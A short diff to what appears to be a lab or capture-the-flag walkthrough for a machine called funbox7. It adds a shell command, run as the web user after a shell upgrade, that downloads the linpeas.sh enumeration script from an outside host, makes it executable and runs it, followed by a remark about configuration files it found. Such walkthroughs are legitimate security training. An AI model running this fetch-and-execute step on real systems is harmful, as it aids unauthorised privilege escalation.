@@ -279,8 +279,9 @@ $
 
 ```shell
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
-www-data@funbox7:/$ 
+www-data@funbox7:/$ mkdir /tmp/privesc && cd /tmp/privesc && wget http://192.168.45.169:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
 ```
+Linpeas found some interesting configuration files
 
 ```shell
 <...>
